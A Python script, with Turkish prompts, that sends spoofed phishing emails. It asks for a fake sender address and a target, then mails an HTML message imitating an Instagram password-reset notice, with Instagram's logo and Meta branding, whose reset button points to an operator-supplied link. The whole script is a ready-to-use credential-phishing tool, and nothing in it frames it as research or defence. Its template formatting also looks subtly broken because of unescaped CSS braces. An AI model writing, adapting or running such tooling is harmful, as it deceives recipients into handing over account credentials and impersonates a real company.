import os
import smtplib
import json
import sys  
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header

def send_email(link):
    
    with open('config.json', 'r', encoding='utf-8') as config_file:
        config = json.load(config_file)

    smtp_server = config['smtp_server']
    smtp_port = config['smtp_port']
    use_tls = config['use_tls']
    from_address = config['from_address']
    password = config['password']

    
    from_spoofed_address = input("Spoof Edilecek Mail Adresini Giriniz: ")
    to_address = input("Gönderilecek Mail Adresini Giriniz: ")
    subject = input("Mail Başlığını Giriniz: ")

    
    email_content = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Şifre Yenileme</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #fafafa;
                margin: 0;
                padding: 0;
                color: #262626;
            }
            .email-container {
                max-width: 600px;
                margin: 0 auto;
                background-color: #ffffff;
                border: 1px solid #dbdbdb;
                border-radius: 8px;
                overflow: hidden;
            }
            .header {
                background-color: #ffffff;
                padding: 20px;
                text-align: center;
                border-bottom: 1px solid #dbdbdb;
            }
            .header img {
                width: 100px; /* Instagram logosu boyutu */
            }
            .content {
                padding: 20px;
                text-align: center;
            }
            .content h1 {
                font-size: 20px;
                margin-bottom: 20px;
                color: #262626;
            }
            .content p {
                font-size: 14px;
                line-height: 1.5;
                margin-bottom: 20px;
                color: #8e8e8e;
            }
            .button {
                display: inline-block;
                padding: 12px 24px;
                font-size: 14px;
                color: #ffffff;
                background-color: #0095f6;
                text-decoration: none;
                border-radius: 8px;
                margin-bottom: 20px;
            }
            .footer {
                padding: 20px;
                text-align: center;
                font-size: 12px;
                color: #8e8e8e;
                border-top: 1px solid #dbdbdb;
            }
            .footer p {
                margin: 5px 0;
            }
            .footer a {
                color: #0095f6;
                text-decoration: none;
            }
        </style>
    </head>
    <body>
        <div class="email-container">
            <div class="header">
                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
            </div>
            <div class="content">
                <h1>Şifreni Mi Unuttun?</h1>
                <p>Merhaba,</p>
                <p>Hesabına erişim sağlamak için aşağıdaki bağlantıya tıklayarak şifreni yenileyebilirsin. Bu bağlantı 24 saat boyunca geçerli olacaktır.</p>
                <a href="{link}" class="button">Şifreyi Yenile</a>
                <p>Eğer bu işlemi sen yapmadıysan, bu e-postayı görmezden gelebilirsin.</p>
            </div>
            <div class="footer">
                <p>Bu e-posta otomatik olarak gönderilmiştir, lütfen cevaplamayınız.</p>
                <p>Instagram, Meta Şirketler Grubu'na aittir.</p>
                <p><a href="#">Yardım Merkezi</a> | <a href="#">Gizlilik Politikası</a></p>
            </div>
        </div>
    </body>
    </html>
    """

    # Linki HTML içine yerleştir
    email_content = email_content.format(link=link)

    # E-posta mesajını oluştur
    msg = MIMEMultipart()
    msg['From'] = Header(from_spoofed_address, 'utf-8')
    msg['To'] = Header(to_address, 'utf-8')
    msg['Subject'] = Header(subject, 'utf-8')

    msg.attach(MIMEText(email_content, 'html', 'utf-8'))

    try:
        print("Bağlantı kuruluyor...")
        server = smtplib.SMTP(smtp_server, smtp_port)

        if use_tls:
            server.starttls()

        print("SMTP Girişi Yapılıyor...")
        server.login(from_address, password)

        print("E-posta gönderiliyor...")
        text = msg.as_string()
        server.sendmail(from_spoofed_address, to_address, text)
        print("Email Gönderildi!")

    except Exception as e:
        print(f"Hata: {e}")

    finally:
        print("Bağlantı kapatılıyor...")
        try:
            server.quit()
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) > 1:
        link = sys.argv[1] 
        send_email(link)
    else:
        print("bir link argümanı gir")
      
